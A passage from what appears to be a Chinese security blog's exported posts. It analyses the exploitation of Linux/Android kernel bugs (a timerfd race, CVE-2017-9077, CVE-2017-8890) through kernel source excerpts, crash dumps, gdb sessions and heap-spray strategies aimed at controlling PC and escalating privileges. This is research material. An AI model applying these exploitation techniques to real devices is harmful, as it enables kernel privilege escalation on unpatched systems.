首先通过竞争条件对cancel_list链表添加了两次同一地址的结构体,第一次释放结构体时会把ctx-&gt;prev指向的内存释放掉,却并没有操作ctx-&gt;next变量的值,因为ctx-&gt;next == ctx-&gt;prev,ctx-&gt;next还指向自身,所以该ctx内存虽然被释放,但还存在cancel_list链表中,紧接着我们通过喷射，填充之前释放的结构体内存。 然后在用户层触发重引用(settimerofday()),settimerofday底层实现函数timerfd_clock_was_set会对cancel_list链表进行遍历,并且取遍历出的ctx结构体成员wqh的地址作为wake_up_locked()函数的参数传入。123456789101112131415161718192021222324252627void clock_was_set(void)&#123;#ifdef CONFIG_HIGH_RES_TIMERS /* Retrigger the CPU local events everywhere */ on_each_cpu(retrigger_next_event, NULL, 1);#endif timerfd_clock_was_set();&#125;void timerfd_clock_was_set(void)&#123; ktime_t moffs = ktime_mono_to_real((ktime_t)&#123; .tv64 = 0 &#125;); struct timerfd_ctx *ctx; unsigned long flags; rcu_read_lock(); list_for_each_entry_rcu(ctx, &amp;cancel_list, clist) &#123; /* 遍历喷射ctx结构体 */ if (!ctx-&gt;might_cancel) continue; spin_lock_irqsave(&amp;ctx-&gt;wqh.lock, flags); if (ctx-&gt;moffs.tv64 != moffs.tv64) &#123; ctx-&gt;moffs.tv64 = KTIME_MAX; ctx-&gt;ticks++; wake_up_locked(&amp;ctx-&gt;wqh); /* 传入喷射结构体 */ &#125; spin_unlock_irqrestore(&amp;ctx-&gt;wqh.lock, flags); &#125; rcu_read_unlock();&#125; 再来看看wake_up_locked函数内部实现。123456789101112131415161718192021222324252627282930#define wake_up_locked(x) __wake_up_locked((x), TASK_NORMAL, 1)void __wake_up_locked(wait_queue_head_t *q, unsigned int mode, int nr)&#123; __wake_up_common(q, mode, nr, 0, NULL);&#125;static void __wake_up_common(wait_queue_head_t *q, unsigned int mode, int nr_exclusive, int wake_flags, void *key)&#123; wait_queue_t *curr, *next; list_for_each_entry_safe(curr, next, &amp;q-&gt;task_list, task_list) &#123; unsigned flags = curr-&gt;flags; if (curr-&gt;func(curr, mode, wake_flags, key) &amp;&amp; /* 控制内核执行流*/ (flags &amp; WQ_FLAG_EXCLUSIVE) &amp;&amp; !--nr_exclusive) break; &#125;&#125;struct __wait_queue_head &#123; spinlock_t lock; struct list_head task_list;&#125;;typedef struct __wait_queue wait_queue_t;typedef int (*wait_queue_func_t)(wait_queue_t *wait, unsigned mode, int flags, void *key); /* 函数指针原型 */struct __wait_queue &#123; unsigned int flags; void *private; wait_queue_func_t func; /* 函数指针 */ struct list_head task_list;&#125;; 可以看到在该函数内部存在一个函数指针(curr-&gt;func)的间接调用,而这个func属于curr的成员,curr又是通过使用list_for_each_entry_safe宏把q-&gt;task_list的next赋值过来的,q又是wake_up_locked函数的参数1,也就是遍历到的ctx成员wqh。 因为cancel_list链表中还存在之前被释放的ctx结构体,所以这里遍历到的ctx结构体也就是我们喷射的ctx结构体,这样看来所有的一切我们似乎都可以控制,只要通过内核源码,精心构造喷射的ctx结构体,绕过内核的一些检测控制内核的执行流还是很容易的。不过构造数据时需要注意一下list_for_each_entry_safe这个宏,不然可能会进入死循环,导致内核崩溃。list_for_each_entry_safe宏 list_for_each_entry_safe(curr, next, &amp;q-&gt;task_list, task_list) #define list_for_each_entry_safe(pos, n, head, member) \\ for (pos = list_entry((head)-&gt;next, typeof(*pos), member), \\ /* curr赋值*/ n = list_entry(pos-&gt;member.next, typeof(*pos), member); \\ /* 初始化pos */ &amp;pos-&gt;member != (head); \\ /* 结束条件 */ pos = n, n = list_entry(n-&gt;member.next, typeof(*n), member)) /* 改变条件 */ 喷射结构体信息12345678910111213141516struct timerfd_ctx &#123; union &#123; struct hrtimer tmr; struct alarm alarm; &#125; t; ktime_t tintv; ktime_t moffs; wait_queue_head_t wqh; /*&gt;&gt;&gt;&gt;&gt;*/ u64 ticks; int clockid; short unsigned expired; short unsigned settime_flags; /* to show in fdinfo */ struct rcu_head rcu; struct list_head clist; bool might_cancel;&#125;; 32位 (gdb) p &amp;((struct timerfd_ctx*)0)-&gt;might_cancel $1 = (bool *) 0x90 64位 (gdb) p &amp;((struct timerfd_ctx*)0)-&gt;might_cancel $1 = (bool *) 0xf0 不同的内核,编译出来的大小也会不一样 触发链在内核中找到了几条触发链:比较无语的就是这些系统调用函数都会判断当前进程是否有CAP_SYS_TIME权限,如果有该权限才会执行后面的函数,不然就会中途退出 sys_stime() -&gt; do_settimeofday() -&gt; clock_was_set() -&gt; timerfd_clock_was_set() adjtimex() -&gt; do_adjtimex() -&gt; clock_was_set() -&gt; timerfd_clock_was_set() settimeofday() -&gt; do_sys_settimeofday -&gt; do_settimeofday() -&gt; clock_was_set() -&gt; timerfd_clock_was_set() 看了下android中的系统进程(SystemServer)是存在该权限的,所以我也可以结合别的AOSP漏洞,先拿到SystemServer进程的执行权限,然后再利用该内核漏洞进行提权,不过感觉好鸡肋啊￣□￣｜｜","categories":[{"name":"Vulnerability","slug":"Vulnerability","permalink":"http://github.com/categories/Vulnerability/"}],"tags":[{"name":"Android_Kernel","slug":"Android-Kernel","permalink":"http://github.com/tags/Android-Kernel/"}]},{"title":"CVE-2017-9077","slug":"CVE-2017-9077","date":"2017-09-20T02:12:15.000Z","updated":"2019-03-30T10:08:59.927Z","comments":true,"path":"2017/09/20/CVE-2017-9077/","link":"","permalink":"http://github.com/2017/09/20/CVE-2017-9077/","excerpt":"","text":"CVE-2017-9077 前言实验环境： 相关信息： 漏洞成因：Linux内核4.11.11之前，net/ipv6/tcp_ipv6.c中的tcp_v6_syn_recv_sock函数错误处理继承，这与CVE-2017-8890类似 修补链接：https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=83eaddab4378db256d00d295bda6ca997cd13a52 漏洞验证执行POC：查看崩溃函数及调用堆栈 [ 226.374015] Unable to handle kernel paging request at virtual address 00200218 [ 226.374053] pgd = ffffffc03eea7000 [ 226.374069] [00200218] *pgd=0000000000000000 [ 226.374096] Internal error: Oops: 96000005 [#1] PREEMPT SMP [ 226.374113] Modules linked in: [ 226.374141] CPU: 3 PID: 3738 Comm: CVE-2017-9077 Not tainted 3.10.58-03546-gd85102c #1 [ 226.374160] task: ffffffc02d199600 ti: ffffffc0384dc000 task.ti: ffffffc0384dc000 [ 226.374194] PC is at ipv6_sock_mc_close+0xa0/0x104 [ 226.374215] LR is at ipv6_sock_mc_close+0x98/0x104 [ 226.374231] pc : [&lt;ffffffc0008bda58&gt;] lr : [&lt;ffffffc0008bda50&gt;] pstate: 80000145 [ 226.374245] sp : ffffffc0384dfd60 [ 226.374259] x29: ffffffc0384dfd60 x28: ffffffc0384dc000 [ 226.374285] x27: ffffffc000e2e000 x26: ffffffc00113b000 [ 226.374310] x25: ffffffc000e3ff40 x24: ffffffc0355aecc0 [ 226.374335] x23: ffffffc00113b1a0 x22: ffffffc0355af318 [ 226.374359] x21: ffffffc0555d06c0 x20: ffffffc0355aedb0 [ 226.374383] x19: 0000000000200200 x18: 00000000ffffffff [ 226.374408] x17: 0000007ee813cb9c x16: ffffffc0001b3390 [ 226.374432] x15: 003b9aca00000000 x14: 001c983560000000 [ 226.374456] x13: ffffffffa58d9e94 x12: 0000000000000020 [ 226.374480] x11: 0000000000000000 x10: 00000000ffffffff [ 226.374504] x9 : 000000000000000a x8 : 0000000000000039 [ 226.374528] x7 : 6620646e6f636573 x6 : 0000007ee780f014 [ 226.374552] x5 : 0000000000000000 x4 : 0000000000000000 [ 226.374576] x3 : 0000000000000003 x2 : 0000000000000000 [ 226.374599] x1 : 0000000000000000 x0 : 0000000000040004 [ 226.374621] [ 226.374637] Process CVE-2017-9077 (pid: 3738, stack limit = 0xffffffc0384dc058) [ 226.375167] Call trace: [ 226.375190] [&lt;ffffffc0008bda58&gt;] ipv6_sock_mc_close+0xa0/0x104 [ 226.375212] [&lt;ffffffc0008977d4&gt;] inet6_release+0x24/0x4c [ 226.375234] [&lt;ffffffc00079ea80&gt;] sock_release+0x2c/0xa8 [ 226.375252] [&lt;ffffffc00079eb18&gt;] sock_close+0x1c/0x30 [ 226.375275] [&lt;ffffffc0001b593c&gt;] __fput+0x9c/0x224 [ 226.375294] [&lt;ffffffc0001b5b94&gt;] ____fput+0x1c/0x2c [ 226.375316] [&lt;ffffffc0000c4acc&gt;] task_work_run+0x9c/0xf4 [ 226.375339] [&lt;ffffffc000088bd4&gt;] do_notify_resume+0x5c/0x74 [ 226.375360] Code: aa1703e0 9402eea1 f9403ed3 b4000253 (f9400e61) [ 226.375378] ---[ end trace 701d394ca5320577 ]--- [ 226.449802] Kernel panic - not syncing: Fatal exception 可以看到内核是在对ipv6的sock进行关闭的时候触发的崩溃，这和我们意料中的一致 漏洞分析静态分析(熟悉触发流程,编写验证程序)有了POC的崩溃信息后，通过崩溃时的PC在IDA中查看崩溃的具体信息 .text:FFFFFFC00046D42C LDR X1, [mc_lst,#0x18] //mc_lst == X19结合vmlinux上下文和内核源码可知这条指令是获取mc_lst-&gt;next中的数据，但是因为此时的mc_lst == 0x200200，属于无效地址，所以导致取其偏移0x18中的内容时崩溃 我们知道是如何导致内核崩溃以后就需要分析他是怎么形成这种情景的，也就是漏洞模型(DoubuleFree)？，感觉这漏洞像是属于释放后重引用漏洞(UAF)，那么我们还是先找到它内存申请的位置和第一次释放的位置，第二次引用的位置申请位置：第一次释放位置第二次引用位置漏洞触发链：内存申请：ipv6_setsockopt( ) –&gt; do_ipv6_setsockopt( ) –&gt; case MCAST_JOIN_GROUP: ipv6_sock_mc_join( ) –&gt; sock_kmalloc( ) 内存释放：sock_close( ) –&gt; sock_release( ) –&gt; inet6_release( ) –&gt; ipv6_sock_mc_close( ) 内存重引用：sock_close( ) –&gt; sock_release( ) –&gt; inet6_release( ) –&gt; ipv6_sock_mc_close( ) 像这种漏洞我一般使用堆喷射来控制释放后的结构体，如果在后续的操作中会调用结构体中的函数指针，那么我们的目的也就达成了这一需要喷射的是mc_lst，它属于ipv6_mc_socklist结构体，123456789struct ipv6_mc_socklist &#123; struct in6_addr addr; int ifindex; struct ipv6_mc_socklist __rcu *next; rwlock_t sflock; unsigned int sfmode; /* MCAST_&#123;INCLUDE,EXCLUDE&#125; */ struct ip6_sf_socklist *sflist; struct rcu_head rcu;&#125;; 通过vmlinux计算该结构体的大小：sizeof(struct ipv6_mc_socklist) == 0x40通过IDA中的反汇编也可以计算其大小(查看引用最后一个成员时使用的偏移，注意：该偏移属于成员偏移，而不是结构体大小，最后可能需要加上最后一个成员的大小)， ：0x30+0x10(struct rcu_head size) == 0x40 .text:FFFFFFC00046D410 MOV X1, #0x30 ; func .text:FFFFFFC00046D414 ADD X0, mc_lst, X1 ; head .text:FFFFFFC00046D418 BL kfree_call_rcu 看了下该结构体中貌似就只有一个struct rcu_head rcu成员中存在函数指针，别的地方还真没有，还存在一个对struct ip6_sf_socklist *sflist成员进行kfree操作 动态调试(深入分析)该漏洞属于ipv6相关漏洞：关键的下断函数 ipv6_setsockopt ipv6_sock_mc_join 因为存在漏洞的64位的goldfish源码编译完毕后我模拟器启动不起来，所以测试环境是先找个模拟器能够启动的64位源码，然后手动修改去除CVE-2017-9077的补丁代码，修改时可以参考补丁链接上的补丁 漏洞利用 喷射思路： 首先获取需要喷射结构体的大小 触发漏洞 创建一个server线程 创建一个client线程 喷射线程 循环设置payload线程 堆喷射成功控制解引用地址 [ 148.998655] Unable to handle kernel paging request at virtual address 4343434343434347 [ 148.998691] pgd = ffffffc063872000 [ 148.998708] [4343434343434347] *pgd=0000000000000000 [ 148.998735] Internal error: Oops: 96000004 [#1] PREEMPT SMP [ 148.998752] Modules linked in: [ 148.998781] CPU: 3 PID: 4301 Comm: CVE-201 Not tainted 3.10.58-03546-gd85102c #1 [ 148.998800] task: ffffffc019bf3700 ti: ffffffc01942c000 task.ti: ffffffc01942c000 [ 148.998834] PC is at ip6_mc_leave_src+0x30/0xa4 [ 148.998856] LR is at ipv6_sock_mc_close+0xe0/0x104 [ 148.998873] pc : [&lt;ffffffc0008bbb98&gt;] lr : [&lt;ffffffc0008bda98&gt;] pstate: 80000145 [ 148.998887] sp : ffffffc01942fd30 [ 148.998901] x29: ffffffc01942fd30 x28: ffffffc01942c000 [ 148.998926] x27: ffffffc000e2e000 x26: ffffffc00113b000 [ 148.998951] x25: ffffffc000e3ff40 x24: ffffffc031daf400 [ 148.998975] x23: ffffffc00113b1a0 x22: ffffffc031dafa58 [ 148.999000] x21: ffffffc031daf400 x20: 0000000000000000 [ 148.999024] x19: ffffffc033818640 x18: 00000000ffffffff [ 148.999048] x17: 00000079b3decb9c x16: ffffffc0001b3390 [ 148.999073] x15: 003b9aca00000000 x14: 00281cfcca000000 [ 148.999097] x13: ffffffffa58d1501 x12: 0000000000000020 [ 148.999121] x11: 0000000000000000 x10: 00000000ffffffff [ 148.999145] x9 : 000000000000000a x8 : 0000000000000039 [ 148.999169] x7 : 6620646e6f636573 x6 : 00000079b2a0c014 [ 148.999193] x5 : 0000000000000000 x4 : 4343434343434343 [ 148.999217] x3 : 0000000000000001 x2 : 0000000043434343 [ 148.999241] x1 : ffffffc033818640 x0 : ffffffc0008bda98 [ 148.999263] [ 148.999279] Process CVE-201 (pid: 4301, stack limit = 0xffffffc01942c058) [ 148.999297] Stack: (0xffffffc01942fd30 to 0xffffffc019430000) [ 148.999318] fd20: 1942fd60 ffffffc0 008bda98 ffffffc0 [ ... ] [ 148.999838] ffe0: 00000004 00000000 00000039 00000000 0038002e 00370031 0020002c 00300032 [ 148.999851] Call trace: [ 148.999874] [&lt;ffffffc0008bbb98&gt;] ip6_mc_leave_src+0x30/0xa4 [ 148.999897] [&lt;ffffffc0008bda94&gt;] ipv6_sock_mc_close+0xdc/0x104 [ 148.999918] [&lt;ffffffc0008977d4&gt;] inet6_release+0x24/0x4c [ 148.999940] [&lt;ffffffc00079ea80&gt;] sock_release+0x2c/0xa8 [ 148.999957] [&lt;ffffffc00079eb18&gt;] sock_close+0x1c/0x30 [ 148.999980] [&lt;ffffffc0001b593c&gt;] __fput+0x9c/0x224 [ 148.999998] [&lt;ffffffc0001b5b94&gt;] ____fput+0x1c/0x2c [ 149.000020] [&lt;ffffffc0000c4acc&gt;] task_work_run+0x9c/0xf4 [ 149.000043] [&lt;ffffffc000088bd4&gt;] do_notify_resume+0x5c/0x74 [ 149.000064] Code: d503201f f9401664 b9402662 b40002a4 (b9400483) [ 149.000185] ---[ end trace 343ee1bba8b5cfe0 ]--- [ 149.074517] Kernel panic - not syncing: Fatal exception struct rcu_head rcu;利用时发现这个成员不能使用，因为内核会修改该成员的值，8890之前是通过一个结构体指针，指向用户空间虽然内核会修改里面的值，但是因为是在用户空间 我们只要开启一个线程进行保护修改就行，而这个不是一个结构体指针，喷射后我们就不能进行修改了 第二个思路：通过struct ipv6_mc_socklist __rcu *next;成员指向用户空间，然后构造数据 控制住了PC，后面的操作就简单多了 [ 116.545938] CPU: 0 PID: 3688 Comm: CVE-2017-9077 Not tainted 3.10.58-03546-gd85102c #1 [ 116.545948] task: ffffffc01d946e00 ti: ffffffc01d970000 task.ti: ffffffc01d970000 [ 116.545958] PC is at 0xaaaaaaaaaaaaaaaa [ 116.545976] LR is at rcu_process_callbacks+0x368/0x5f0 [ 116.545984] pc : [&lt;aaaaaaaaaaaaaaaa&gt;] lr : [&lt;ffffffc00012e1d0&gt;] pstate: a0000145 [ 116.545990] sp : ffffffc01d973930 [ 116.545996] x29: ffffffc01d973930 x28: ffffffc0b3f40060 [ 116.546007] x27: 0000000000000001 x26: ffffffc025b9dd00 [ 116.546019] x25: ffffffc01cc40a48 x24: ffffffc000981000 [ 116.546031] x23: ffffffc01d970000 x22: 000000000000000a [ 116.546042] x21: 0000000000000001 x20: ffffffc0b3f40088 [ 116.546053] x19: ffffffc000e33300 x18: 00000000ffffffff [ 116.546065] x17: 00000074716cc25c x16: ffffffc0001da624 [ 116.546076] x15: 000000747170672c x14: 0000007471706a88 [ 116.546088] x13: ffffffc000985990 x12: 0000000000000001 [ 116.546100] x11: 00000000000003d8 x10: 00000000000001a0 [ 116.546111] x9 : ffffffc000985990 x8 : 0000000000000001 [ 116.546123] x7 : ffffffc0b3f43a58 x6 : 0000000000000007 [ 116.546134] x5 : aaaaaaaaaaaaaaaa x4 : 0000000000000001 [ 116.546145] x3 : 0000000000000000 x2 : 0000000000000081 [ 116.546157] x1 : 0000000002000030 x0 : 0000000002000030 [ 116.546168] [ 116.546175] Process CVE-2017-9077 (pid: 3688, stack limit = 0xffffffc01d970058) [ 116.546728] Call trace: [ 116.546737] [&lt;aaaaaaaaaaaaaaaa&gt;] 0xaaaaaaaaaaaaaaaa [ 116.546749] [&lt;ffffffc0000a9a7c&gt;] __do_softirq+0x108/0x288 [ 116.546757] [&lt;ffffffc0000a9cc4&gt;] do_softirq+0x64/0x70 [ 116.546766] [&lt;ffffffc0000a9f48&gt;] irq_exit+0x94/0xc8 [ 116.546776] [&lt;ffffffc0000848b8&gt;] handle_IRQ+0x58/0xd8 [ 116.546785] [&lt;ffffffc0000813fc&gt;] gic_handle_irq+0x44/0x88 提权因为x0可控，使用总体来说提权还是蛮好提的，直接kernel_sock_ioctl即可kernel_sock_ioctl == ffffffc00079beb4 1.调用rcu回调时在别的进程中，导致访问地址失败，因为别的进程没有映射我们设置的地址 2.稳定崩溃在kfree函数中貌似因为内核竞争修改没有修改成功导致 本来以为可以复用8890那漏洞的思路，但是看了下漏洞结构体mc_lst，其中包含两个与rcu机制相关的结构体成员，1.struct rcu_head rcu2.struct ipv6_mc_socklist_rcu *next 最开始打算用mc_lst结构体中的rcu结构体成员，但是后来发现在kfree_rcu函数中会对我们控制的mc_lst-&gt;rcu.func函数指针做初始化，但是因为mc_lst成员不是指针，所以其成员在数据喷射的时候就已经固定在内核中了，这样就导致了我们直接喷射的数据不能利用，而需要通过间接利用，所以第一个结构体不能使用 还存在一个ipv6_mc_socklist_rcu next的函数指针，这个函数指针满足间接利用的条件(属于指针且可控)，尝试在用户态构造一个ipv6_mc_socklist_rcu结构体，让ipv6_mc_socklist_rcu next指针指向它，这样当内核kfree_rcu第一个ipv6_mc_socklist_rcu结构体后就会kfree_rcu第二个(用户态)的ipv6_mc_socklist_rcu结构体，这样会再次添加一个rcu回调函数并且可控 为什么8890可以利用呢？因为之前8890结构体中还存在一个结构体指针，该结构体中存在一个rcu_head结构体，因为该结构体指针是一个我们可控指针，所以可以把该指针指向用户空间可控的数据，然后再开启一个竞争修改数据的线程，与内核竞争修改rcu.func函数指针的值为我们想要控制的指针，就可以控制ruc回调函数的调用 可能在poc执行完毕后，测试机都没有崩溃第一次调用ipv6_sock_mc_close时竟然没进入循环 总结发生的情况","categories":[{"name":"Vulnerability","slug":"Vulnerability","permalink":"http://github.com/categories/Vulnerability/"}],"tags":[{"name":"Android_Kernel","slug":"Android-Kernel","permalink":"http://github.com/tags/Android-Kernel/"}]},{"title":"CVE-2017-8890","slug":"CVE-2017-8890","date":"2017-09-20T02:12:15.000Z","updated":"2019-03-30T10:08:38.271Z","comments":true,"path":"2017/09/20/CVE-2017-8890/","link":"","permalink":"http://github.com/2017/09/20/CVE-2017-8890/","excerpt":"","text":"CVE-2017-8890 前言影响版本理论上Linux Kernel 2.5.69~Linux Kernel 4.11 测试内核Linux version 3.4.67-gd3ffcc7-dirty (ubuntu@ubuntu) (gcc version 4.6.x-google 20120106 (prerelease) (GCC) ) #4 PREEMPT Mon Sep 11 09:06:06 CST 2017(32位)PS：因为没找到合适的64位goldfish源码，所以直接使用的32位进行调试，64位原理是一致的 漏洞描述该漏洞属于一个Doubel Free漏洞,Linux内核中net/ipv4/inet_connection_sock.c中的inet_csk_clone_lock函数中存在浅拷贝问题,当我们调用accept函数时,会调用底层函数inet_csk_clone函数。若有客户端连接到该服务端,会用到accept函数中参数1和返回值,底层函数inet_csk_clone会将accept函数的参数1(parent_sockfd)所对应的sk变量拷贝到accept函数返回值(child_sockfd)所对应的sk变量中,但并没有清空child_sockfd所对应的sk-&gt;mc_list的值,当使用close函数对这两个句柄进行关闭时,会对sk结构中的iml进行两次释放,通过堆喷射可执行任意代码。 Google修复链接https://android.googlesource.com/kernel/goldfish/+/88c573e1342ea5734088052879987c0e8f9bf10c%5E%21/#F0 漏洞复现PC is at 0xeeeeeeea LR is at __rcu_process_callbacks+0x8c/0xa4 pc : [&lt;eeeeeeea&gt;] lr : [&lt;c0069f78&gt;] psr: a0000133 sp : c611de88 ip : c6d2dd98 fp : 0000000a r10: 00000009 r9 : d400e810 r8 : c9635ec8 r7 : 00000101 r6 : b6efb008 r5 : 00000fff r4 : c6d2dd98 r3 : eeeeeeee r2 : 00000000 r1 : 00000101 r0 : b6efb008 漏洞分析要点 对象何时何处被分配 内存分配链：sys_setsockopt( ) -&gt; sock_common_setsockopt( ) -&gt; tcp_setsockopt( ) -&gt; ip_setsockopt( ) -&gt; do_ip_setsockopt( ) -&gt; ip_mc_join_group( ) -&gt; sock_kmalloc( ) -&gt; […] 对象何时何处存在浅拷贝 浅拷贝链：tcp_v4_syn_recv_sock -&gt; tcp_create_openreq_child -&gt; inet_csk_clone_lock( ) -&gt; sk_clone_lock( ) -&gt; sock_copy( ) -&gt; […] 对象何时何处被二次使用 释放调用链:sys_close( ) -&gt; filp_close( ) -&gt; fput( ) -&gt; __fput( ) -&gt; sock_close( ) -&gt; sock_release( ) -&gt; inet_release( ) -&gt; ip_mc_drop_socket( ) -&gt; […] 静态分析首先我们看android对该漏洞做的补丁，只是简单的对newsk结构体指针指向的mc_list成员做了下初始化，并没有多余的修补代码，那么我们详细看下newsk是怎么来的，可以看到来源于sk_clone_lock( )函数的返回值，我们直接到sk_clone_lock函数中看看 浅拷贝链：12345678910111213141516171819202122232425262728struct sock *inet_csk_clone_lock(const struct sock *sk, /*克隆一个传输控制块，并对新的传输控制块上锁*/ const struct request_sock *req, const gfp_t priority)&#123; struct sock *newsk = sk_clone_lock(sk, priority); /*从缓冲中分配一个sock，并克隆sk*/ if (newsk) &#123; struct inet_connection_sock *newicsk = inet_csk(newsk); newsk-&gt;sk_state = TCP_SYN_RECV; /*设置新sock的状态为TCP_SYN_RECV*/ newicsk-&gt;icsk_bind_hash = NULL; inet_sk(newsk)-&gt;inet_dport = inet_rsk(req)-&gt;ir_rmt_port; /*设置新sock的目的端口*/ inet_sk(newsk)-&gt;inet_num = inet_rsk(req)-&gt;ir_num; inet_sk(newsk)-&gt;inet_sport = htons(inet_rsk(req)-&gt;ir_num); /*设置新sock的源端口*/ newsk-&gt;sk_write_space = sk_stream_write_space; /* listeners have SOCK_RCU_FREE, not the children */ sock_reset_flag(newsk, SOCK_RCU_FREE); inet_sk(newsk)-&gt;mc_list = NULL; /*补丁位置 添加了一行对mc_list的初始化*/ newsk-&gt;sk_mark = inet_rsk(req)-&gt;ir_mark; atomic64_set(&amp;newsk-&gt;sk_cookie, atomic64_read(&amp;inet_rsk(req)-&gt;ir_cookie)); newicsk-&gt;icsk_retransmits = 0; newicsk-&gt;icsk_backoff = 0; newicsk-&gt;icsk_probes_out = 0; /* Deinitialize accept_queue to trap illegal accesses. */ memset(&amp;newicsk-&gt;icsk_accept_queue, 0, sizeof(newicsk-&gt;icsk_accept_queue)); security_inet_csk_clone(newsk, req); &#125; return newsk; /*返回新sock的内存地址*/&#125; 根据内核源码注释可知sk_clone_lock用于拷贝一个socket，这里先申请一块内存，然后把传入的sk数据拷贝到新申请的内存中，并对新的sk结构体做一些初始化123456789101112131415161718192021222324252627282930313233343536373839/*** sk_clone_lock - clone a socket, and lock its clone* @sk: the socket to clone* @priority: for allocation (%GFP_KERNEL, %GFP_ATOMIC, etc)** Caller must unlock socket even in error path (bh_unlock_sock(newsk))*/struct sock *sk_clone_lock(const struct sock *sk, const gfp_t priority)&#123; struct sock *newsk; bool is_charged = true; newsk = sk_prot_alloc(sk-&gt;sk_prot, priority, sk-&gt;sk_family); /*新sock内存申请函数*/ if (newsk != NULL) &#123; struct sk_filter *filter; sock_copy(newsk, sk); /*浅拷贝函数*/ /* SANITY */ get_net(sock_net(newsk)); [...] skb_queue_head_init(&amp;newsk-&gt;sk_error_queue); filter = rcu_dereference_protected(newsk-&gt;sk_filter, 1); if (filter != NULL) [...] if (unlikely(!is_charged || xfrm_sk_clone_policy(newsk))) &#123; [...] goto out; &#125; newsk-&gt;sk_err = 0; newsk-&gt;sk_priority = 0; /* * Before updating sk_refcnt, we must commit prior changes to memory * (Documentation/RCU/rculist_nulls.txt for details) */ smp_wmb(); atomic_set(&amp;newsk-&gt;sk_refcnt, 2); [...] &#125;out: return newsk; /*返回前面申请的内存首地址,用做newsk*/&#125; 12345678910111213141516171819/** Copy all fields from osk to nsk but nsk-&gt;sk_refcnt must not change yet,* even temporarly, because of RCU lookups. sk_node should also be left as is.* We must not copy fields between sk_dontcopy_begin and sk_dontcopy_end*//*这里的osk就是accept第一个参数socketfd对应的parent_socket，nsk就是accept函数返回的socketfd对应的child_sockfd*/static void sock_copy(struct sock *nsk, const struct sock *osk)&#123;#ifdef CONFIG_SECURITY_NETWORK void *sptr = nsk-&gt;sk_security;#endif /*存在浅拷贝的位置*/ memcpy(nsk, osk, offsetof(struct sock, sk_dontcopy_begin)); memcpy(&amp;nsk-&gt;sk_dontcopy_end, &amp;osk-&gt;sk_dontcopy_end, osk-&gt;sk_prot-&gt;obj_size - offsetof(struct sock, sk_dontcopy_end));#ifdef CONFIG_SECURITY_NETWORK nsk-&gt;sk_security = sptr; security_sk_clone(osk, nsk);#endif&#125; 上面标记拷贝处就是漏洞的成因，因为内核中直接通过memcpy克隆了一个socket，并且未对克隆后的socket中的mc_list结构体变量做初始化，导致了浅拷贝问题，也就是两个socket中存在一个变量同时指向同一块mc_list内存，如果其中一个socket被关闭那么该内存就会被释放，而另一个socket却还残留着这块内存的引用指针，这样就导致uaf漏洞或者doublefree漏洞。 那么该对象是何时何处被申请的呢?内存分配链：sys_setsockopt() -&gt; sock_common_setsockopt() -&gt; tcp_setsockopt() -&gt; ip_setsockopt() -&gt; do_ip_setsockopt() -&gt; ip_mc_join_group( ) -&gt; sock_kmalloc( ) -&gt; […] 1234567891011int ip_setsockopt(struct sock *sk, int level, int optname, char __user *optval, unsigned int optlen)&#123; int err; if (level != SOL_IP) return -ENOPROTOOPT; err = do_ip_setsockopt(sk, level, optname, optval, optlen);#ifdef CONFIG_NETFILTER [……]#endif return err;&#125;EXPORT_SYMBOL(ip_setsockopt); 123456789101112131415161718192021222324252627282930313233343536373839static int do_ip_setsockopt(struct sock *sk, int level, int optname, char __user *optval, unsigned int optlen)&#123; struct inet_sock *inet = inet_sk(sk); int val = 0, err; switch (optname) &#123; case IP_PKTINFO: case IP_RECVTTL: case IP_RECVOPTS:[…]case MCAST_JOIN_GROUP:case MCAST_LEAVE_GROUP:&#123; struct group_req greq; struct sockaddr_in *psin; struct ip_mreqn mreq; if (optlen &lt; sizeof(struct group_req)) goto e_inval; err = -EFAULT; if (copy_from_user(&amp;greq, optval, sizeof(greq))) break; psin = (struct sockaddr_in *)&amp;greq.gr_group; if (psin-&gt;sin_family != AF_INET) goto e_inval; memset(&amp;mreq, 0, sizeof(mreq)); mreq.imr_multiaddr = psin-&gt;sin_addr; mreq.imr_ifindex = greq.gr_interface; if (optname == MCAST_JOIN_GROUP) err = ip_mc_join_group(sk, &amp;mreq); else err = ip_mc_leave_group(sk, &amp;mreq); break;&#125;[…] release_sock(sk); return err;e_inval: release_sock(sk); return -EINVAL;&#125; 12345678910111213141516171819202122int ip_mc_join_group(struct sock *sk , struct ip_mreqn *imr)&#123; int err; __be32 addr = imr-&gt;imr_multiaddr.s_addr; [……] if (count &gt;= sysctl_igmp_max_memberships) goto done; iml = sock_kmalloc(sk, sizeof(*iml), GFP_KERNEL); /* 申请内存 */ if (iml == NULL) goto done; memcpy(&amp;iml-&gt;multi, imr, sizeof(*imr)); iml-&gt;next_rcu = inet-&gt;mc_list; iml-&gt;sflist = NULL; iml-&gt;sfmode = MCAST_EXCLUDE; rcu_assign_pointer(inet-&gt;mc_list, iml); ip_mc_inc_group(in_dev, addr); err = 0;done: rtnl_unlock(); return err;&#125;EXPORT_SYMBOL(ip_mc_join_group); 漏洞利用对象何时何处被二次使用?释放调用链:sys_close –&gt; filp_close –&gt; fput –&gt; __fput –&gt; sock_close –&gt; sock_release –&gt; inet_release –&gt; ip_mc_drop_socket 动态调试可以通过编译内核，然后使用模拟器 + gdb进行动态调试首先在ip_mc_join_group()函数处下断点,运行poc，程序会在ip_mc_join_group函数处断下,单步调试到执行完sock_kmalloc函数此时应该属于第一个socket创建时申请ip_mc_socklist结构体内存，我们记录申请的内存首地址0xc6d2dd80，接着单步运行，直到该函数结尾处记录其结构体中的数据 12345678910111213141516171819202122232425262728293031323334353637383940(gdb) break ip_mc_join_groupBreakpoint 1 at 0xc02ddd8c: file net/ipv4/igmp.c, line 1781.(gdb) cContinuing.Breakpoint 1, ip_mc_join_group (sk=0xd3865240, imr=0xc611de08) at net/ipv4/igmp.c:17811781 &#123;(gdb) n1783 __be32 addr = imr-&gt;imr_multiaddr.s_addr;1781 &#123;[……]1815 iml = sock_kmalloc(sk, sizeof(*iml), GFP_KERNEL);1816 if (iml == NULL)1819 memcpy(&amp;iml-&gt;multi, imr, sizeof(*imr));1820 iml-&gt;next_rcu = inet-&gt;mc_list;1821 iml-&gt;sflist = NULL;1822 iml-&gt;sfmode = MCAST_EXCLUDE;1820 iml-&gt;next_rcu = inet-&gt;mc_list;1823 rcu_assign_pointer(inet-&gt;mc_list, iml);(gdb) p iml$1 = (struct ip_mc_socklist *) 0xc6d2dd80 //申请的内存地址(gdb) p *iml$2 = &#123; next_rcu = 0x0, multi = &#123; imr_multiaddr = &#123; s_addr = 16843240 &#125;, imr_address = &#123; s_addr = 